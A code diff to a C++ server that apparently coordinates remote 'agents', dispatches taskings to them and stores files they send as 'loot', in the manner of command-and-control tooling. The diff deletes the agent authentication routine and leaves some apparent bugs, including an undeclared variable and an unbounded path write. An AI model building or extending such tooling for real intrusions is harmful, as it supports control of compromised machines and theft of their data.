@@ -109,10 +109,10 @@ int Server::DispatchTasking(){
         loop++;
 
         assert(loop <10);
-        printf("Size: %ld\n", this->task_dispatch->size());
+        //printf("Size: %ld\n", this->task_dispatch->size());
         
         ptask_t task = this->task_dispatch->front();
-        printf("server task ptr: %p\n", task);
+        //printf("server task ptr: %p\n", task);
         bool found = false;
         // loop over each NetInst
         for(NetInst *inst : *instances){
@@ -138,7 +138,6 @@ int Server::DispatchTasking(){
         if(!found){
             log(LOG_ERROR, "No registered instance with ID '%d' found for tasking (type %d)", task->to, task->type);
         }
-        printf("DEQUEING!\n");
         this->task_dispatch->pop_front();
     }
 
@@ -168,16 +167,14 @@ int Server::GenerateInstance(Module* mod, int port){
 
     // set up thread classes
     int nid = rand();
-    NetInst *inst = new NetInst(this, nid, NULL);
-    TransportAPI* transport = mod->NewTransport(inst);
+    NetInst *inst = new NetInst(this, nid, mod);
+
     if(port != 0){
-        if(!api_check(transport->set_port(port))) {
+        if(inst->SetTransportPort(port)) {
             log(LOG_ERROR, "Failed to create NetInstance\n");
             return 1;
         }
     }
-    
-    inst->SetTransport(transport);
     
     // push to the back and start the thread
     instances->push_back(inst);
@@ -303,7 +300,7 @@ int Server::AddModule(void *handle){
     }
             
 
-    void *(*api_generator)(NetInst *);
+    void *(*api_generator)();
     void (*entrypoint)();
     Module *module;
 
@@ -312,7 +309,7 @@ int Server::AddModule(void *handle){
     switch(type){
         case TRANSPORT:
             // resolve transport API and add it to available transport APIs
-            api_generator = (void *(*)(NetInst *))dlsym(handle, "generate_class");
+            api_generator = (void *(*)())dlsym(handle, "generate_class");
             if(!api_generator) {
                 log(LOG_ERROR, "Failed to find transport API structure"); 
                 return 1;
@@ -475,17 +472,17 @@ int Server::HandleTaskings(){
 
 // handles an individual tasking operation
 int Server::HandleTask(ptask_t task){
-    printf("Task received:\n");
+    /*printf("Task received:\n");
     printf("\tTO: %d\n", task->to);
     printf("\tFROM: %d\n", task->from);
     printf("\tTYPE: %d\n", task->type);
     printf("\tLENGTH: %lu\n", task->length);
-    printf("\tDATA ADDRESS: %p\n", task->data);
+    printf("\tDATA ADDRESS: %p\n", task->data);*/
 
     switch (task->type)
     {
     // authentication check
-    case TASK_AUTH:
+    /*case TASK_AUTH:
         {
             pauth_t auth = (pauth_t) task->data;
             int success = Authenticate(auth);
@@ -493,15 +490,15 @@ int Server::HandleTask(ptask_t task){
             PushTask(remote_task);
         }
         break;
-
+        */
     // create new backend instance
     case TASK_NEW_NETINST:
         log(LOG_INFO, "Caught request for new backend (UNIMPLEMENTED)");
         {
-            int inst_id = (int) *(task->data);
-            int portno = (int) *(task->data[4]);
+            int inst_id = (int) *(int*)(task->data);
+            int portno = (int) *(int*)((task->data) + 4);
             bool found = false;
-            for(Module* m : modules) {
+            for(Module* m : *modules) {
                 if(m->GetID() == inst_id){
                     found = true;
                     if(GenerateInstance(m, portno)) {
@@ -534,7 +531,8 @@ int Server::HandleTask(ptask_t task){
     case TASK_SAVE_FILE:
         {
             log(LOG_INFO, "Saving file from agent");
-            char* fname = Common::digest(file->path);
+            pnet_file file = parse_networked_file(task->data, task->length);
+            char* fname = Common::sha_digest(file->path);
             char path[2048];
             char cwd[BUFSIZ];
 
@@ -542,10 +540,10 @@ int Server::HandleTask(ptask_t task){
             memset(cwd, 0, sizeof(cwd));
             bool found = false;
 
-            for(NetInst* n : instances) {
-                if(n == task->from()) {
+            for(NetInst* n : *instances) {
+                if(n->GetID() == (task->from)) {
                     found = true;
-                    char* agent_id = m->GetAgentName();
+                    char* agent_id = n->GetAgentName();
                     if(agent_id == nullptr) {
                         ptask_t remote_task = CreateTasking(task->from, RESP_FAIL, 0, nullptr);
                         PushTask(remote_task);
@@ -557,10 +555,12 @@ int Server::HandleTask(ptask_t task){
 
             if(found) {
                 sprintf(path, "%s/agents/%s/loot/%s.bin", getcwd(cwd, sizeof(cwd)), id, fname);
-                int success = Common::write_networked_file(task->data, path);
+                int success = Common::write_networked_file(file, path);
                 ptask_t remote_task = CreateTasking(task->from, success, 0, nullptr);
                 PushTask(remote_task);
             }
+
+            free_networked_file(&file);
 
         }
         break;
@@ -604,81 +604,6 @@ ptask_t Server::CreateTasking(int to, unsigned char type, unsigned long length, 
 }
 
 
-// checks an agents credentials
-int Server::Authenticate(pauth_t auth){
-    // initialize variables
-    char** tokens = NULL;
-    char** subtokens = NULL;
-    char *buff;
-    int size = 0;
-    
-    // read in data into buffer
-    size = Common::get_file("agents/agents.dat", &buff);
-    
-    if(size == 0){
-        log(LOG_ERROR, "Found default agent file. Register agents by compiling them with this install");
-        return RESP_FAIL;
-    }
-
-    tokens = Common::str_split(buff, '\n');
-
-    // begin going through usernames and hashes to attemtp to authenticate
-    if(tokens){
-        int j;
-
-        // loop over each line in file
-        for (j = 0; *(tokens + j); j++)
-        {
-            // Split at `:` (to get username and hash separeately)
-            subtokens = Common::str_split(*(tokens + j), ':');
-
-            // check if `usr` is the current line's username
-            if(!strcmp(auth->uname, *(subtokens))){
-                // check if the digest of `pass` is the same as the hash
-                char *auth_pass = Common::digest(auth->passwd);
-                if(!strcmp(auth_pass, *(subtokens+1))){
-                    free(auth_pass);
-                    // success and free
-                    log(LOG_INFO, "ID %s successfully authenticated", auth->uname);
-                    for (int i = 0; *(tokens + i); i++)
-                    {
-                        free(*(tokens + i));
-                    }
-                    for (int i = 0; *(subtokens+i); i++)
-                    {
-                        free(*(subtokens+i));
-                    }
-                    free(subtokens);
-                    free(tokens);
-                    return RESP_OK;
-                }
-                else {
-                    free(auth_pass);
-                    // note here that we do not break the loop, 
-                    //t o prevent brute forcing of IDs through response time correlation
-                    log(LOG_WARN, "ID %s failed to pass password authentication\n", auth->uname);
-                    return RESP_FAIL;
-                }
-            }
-        }
-        // unknown username
-        log(LOG_WARN, "ID %s unknown to this server\n", auth->uname);
-    }
-
-    // free tokens
-    for (int i = 0; *(tokens + i); i++)
-    {
-        free(*(tokens + i));
-    }
-    for (int i = 0; *(subtokens+i); i++)
-    {
-        free(*(subtokens+i));
-    }
-    free(subtokens);
-    free(tokens);
-
-    return RESP_FAIL;
-}
 
 
 // the main logical loop of the server
